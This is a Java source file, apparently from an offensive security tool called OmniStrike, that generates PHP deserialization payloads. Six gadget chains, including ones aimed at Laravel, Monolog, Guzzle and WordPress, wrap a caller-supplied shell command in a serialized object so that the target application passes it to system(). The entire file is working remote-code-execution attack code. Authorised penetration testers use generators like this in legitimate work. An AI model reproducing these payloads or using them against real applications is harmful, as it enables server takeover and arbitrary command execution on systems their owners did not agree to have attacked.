package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * PHP deserialization payload generators.
 *
 * Pure string construction of O:class:fields format.
 * No external dependencies needed — payloads are serialized PHP objects as strings.
 */
public final class PhpPayloads {

    private PhpPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();
        chains.put("LaravelPOP", "Laravel POP chain via Illuminate\\Broadcasting\\PendingBroadcast");
        chains.put("MonologRCE", "Monolog BufferHandler → system() RCE");
        chains.put("GuzzleFnStream", "Guzzle FnStream __destruct RCE");
        chains.put("WordPressPHPObject", "WordPress PHPObject gadget chain");
        chains.put("GenericDestruct", "Generic __destruct / __wakeup system() call");
        chains.put("GenericPHPGGC", "Generic PHP unserialize with system() via __toString");
        return chains;
    }

    public static byte[] generate(String chain, String command) {
        String payload = switch (chain) {
            case "LaravelPOP"         -> generateLaravelPop(command);
            case "MonologRCE"         -> generateMonologRce(command);
            case "GuzzleFnStream"     -> generateGuzzleFnStream(command);
            case "WordPressPHPObject" -> generateWordPressPHPObject(command);
            case "GenericDestruct"    -> generateGenericDestruct(command);
            case "GenericPHPGGC"      -> generateGenericToString(command);
            default -> throw new IllegalArgumentException("Unknown PHP chain: " + chain);
        };
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static String generateLaravelPop(String command) {
        return "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{" +
                "s:9:\"\0*\0events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{" +
                "s:12:\"\0*\0listeners\";a:1:{" +
                "s:6:\"system\";a:1:{i:0;s:6:\"system\";}}}" +
                "s:8:\"\0*\0event\";s:" + command.length() + ":\"" + command + "\";}";
    }

    private static String generateMonologRce(String command) {
        return "O:29:\"Monolog\\Handler\\BufferHandler\":3:{" +
                "s:10:\"\0*\0handler\";O:29:\"Monolog\\Handler\\SyslogHandler\":1:{" +
                "s:9:\"\0*\0ident\";s:" + command.length() + ":\"" + command + "\";}" +
                "s:13:\"\0*\0bufferSize\";i:-1;" +
                "s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{" +
                "s:7:\"message\";s:" + command.length() + ":\"" + command + "\";" +
                "s:5:\"level\";i:100;}}}";
    }

    private static String generateGuzzleFnStream(String command) {
        return "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{" +
                "s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";" +
                "a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{" +
                "s:32:\"\0GuzzleHttp\\HandlerStack\0handler\";s:6:\"system\";" +
                "s:30:\"\0GuzzleHttp\\HandlerStack\0stack\";a:1:{" +
                "i:0;a:1:{i:0;s:6:\"system\";}}" +
                "s:31:\"\0GuzzleHttp\\HandlerStack\0cached\";b:0;}" +
                "i:1;s:7:\"resolve\";}}" +
                "s:9:\"_fn_close\";a:2:{i:0;s:6:\"system\";i:1;s:" +
                command.length() + ":\"" + command + "\";}}";
    }

    private static String generateWordPressPHPObject(String command) {
        return "O:43:\"WpOrg\\Requests\\Utility\\FilteredIterator\":2:{" +
                "s:8:\"\0*\0data\";a:1:{i:0;s:" + command.length() + ":\"" + command + "\";}" +
                "s:12:\"\0*\0callback\";s:6:\"system\";}";
    }

    private static String generateGenericDestruct(String command) {
        return "O:11:\"OmniStrike\":2:{" +
                "s:4:\"func\";s:6:\"system\";" +
                "s:4:\"args\";s:" + command.length() + ":\"" + command + "\";}";
    }

    private static String generateGenericToString(String command) {
        return "a:1:{i:0;O:11:\"OmniStrike\":2:{" +
                "s:8:\"callback\";s:6:\"system\";" +
                "s:9:\"parameter\";s:" + command.length() + ":\"" + command + "\";}}";
    }
}
